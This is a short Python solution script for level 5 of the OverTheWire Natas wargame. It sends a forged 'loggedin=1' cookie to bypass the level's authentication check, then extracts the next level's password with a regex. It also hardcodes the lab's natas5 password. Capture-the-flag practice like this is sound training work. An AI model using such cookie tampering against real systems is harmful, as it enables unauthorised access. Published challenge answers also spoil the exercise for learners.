#!/usr/bin/env python

#Importing Packages and Libraries
import requests
import re

#Declaring the Authentication
username = 'natas5'
password = 'Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD'
url = 'http://%s.natas.labs.overthewire.org/' %username

#Functions
session = requests.session()
cookie = {"loggedin" : "1"}
response = session.get(url, auth = (username, password), cookies = cookie)
content = response.text

#Printing the Cookies
#print(session.cookies['loggedin'])

#Printing the Source Code
#print(content)

#Printing only the Password
print(re.findall('natas6 is (.*)</div>', content)[0])